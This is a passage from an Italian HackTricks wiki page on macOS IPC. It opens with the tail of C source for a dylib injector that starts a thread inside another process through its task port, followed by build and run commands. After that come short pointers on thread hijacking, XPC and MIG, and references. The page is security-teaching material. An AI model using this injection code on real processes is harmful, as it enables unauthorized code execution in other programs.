remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Stack remoto 64  0x%llx, Il codice remoto è %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Impossibile creare il thread remoto: errore %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Utilizzo: %s _pid_ _azione_\n", argv[0]);
fprintf (stderr, "   _azione_: percorso di un dylib su disco\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *azione = argv[2];
struct stat buf;

int rc = stat (azione, &buf);
if (rc == 0) inject(pid,azione);
else
{
fprintf(stderr,"Dylib non trovato\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Hijacking del thread tramite la porta Task <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In questa tecnica viene dirottato un thread del processo:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Informazioni di base

XPC, che sta per XNU (il kernel utilizzato da macOS) inter-Process Communication, è un framework per la **comunicazione tra processi** su macOS e iOS. XPC fornisce un meccanismo per effettuare **chiamate di metodo sicure e asincrone tra processi diversi** nel sistema. Fa parte del paradigma di sicurezza di Apple, consentendo la **creazione di applicazioni con privilegi separati** in cui ogni **componente** viene eseguito con **solo i permessi necessari** per svolgere il proprio lavoro, limitando così i danni potenziali da un processo compromesso.

Per ulteriori informazioni su come funziona questa **comunicazione** e su come **potrebbe essere vulnerabile**, consulta:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG è stato creato per **semplificare il processo di creazione del codice Mach IPC**. Fondamentalmente, **genera il codice necessario** per la comunicazione tra server e client con una definizione data. Anche se il codice generato è brutto, uno sviluppatore dovrà solo importarlo e il suo codice sarà molto più semplice rispetto a prima.

Per ulteriori informazioni, consulta:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Riferimenti

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
